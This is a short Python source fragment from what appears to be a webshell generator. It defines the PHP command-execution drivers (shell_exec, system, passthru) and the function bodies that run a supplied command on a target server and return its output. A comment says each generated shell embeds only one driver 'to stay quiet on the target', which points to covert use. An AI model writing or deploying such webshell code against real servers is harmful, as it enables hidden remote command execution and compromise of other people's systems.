# --- Command execution drivers ---------------------------------------------

# PHP functions the webshell can use to run a command. The FIRST entry is the
# default; the rest are only used if the user picks one with `create --driver`.
# The generated shell embeds exactly ONE driver (no runtime probing), to stay
# quiet on the target.
DRIVERS: tuple[str, ...] = (
    "shell_exec",
    "system",
    "passthru",
)

DEFAULT_DRIVER: str = DRIVERS[0]

# PHP body for __ss_run(), per driver. Drivers that echo their output
# (system, passthru) are captured with output buffering; shell_exec returns it.
DRIVER_BODIES: dict[str, str] = {
    "shell_exec": "return (string) shell_exec($__ss_cmd);",
    "system": "ob_start(); system($__ss_cmd); return ob_get_clean();",
    "passthru": "ob_start(); passthru($__ss_cmd); return ob_get_clean();",
}